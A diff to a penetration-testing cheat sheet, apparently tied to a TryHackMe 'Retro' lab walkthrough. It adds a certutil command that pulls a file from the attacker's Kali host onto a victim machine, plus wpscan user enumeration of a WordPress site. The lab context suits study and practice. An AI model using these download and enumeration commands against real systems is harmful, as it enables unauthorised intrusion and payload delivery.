@@ -323,6 +323,18 @@ wget http://$VICTIM/$FILE
 wget http://$VICTIM:81/$FILE
 ```
 
+#### **certutil**
+
+**Example**
+
+[retro.md](../walkthroughs/tryhackme/retro.md "mention")
+
+**Victim**&#x20;
+
+```
+certutil -urlcache -f http://$KALI:81/$FILE $FILE
+```
+
 ### Run Web server
 
 #### Kali
@@ -335,10 +347,26 @@ python2 -m SimpleHTTPServer 81
 
 #### Scan wordpress site
 
+**Examples**
+
+[retro.md](../walkthroughs/tryhackme/retro.md "mention")
+
 #### Kali
 
 ```
 wpscan --url http://$VICTIM
+```
+
+#### Enumerate wordpress site
+
+**Examples**
+
+[retro.md](../walkthroughs/tryhackme/retro.md "mention")
+
+#### Kali
+
+```
+wpscan --url http://$VICTIM--enumerate u
 ```
 
 #### Bruteforce admin page
@@ -632,6 +660,10 @@ sudo nmap $VICTIM -p3389 --script rdp-ntlm-info
 ```
 rdesktop -u $USERNAME $VICTIM
 ```
+
+**Examples**
+
+[retro.md](../walkthroughs/tryhackme/retro.md "mention")
 
 **Kali**
 
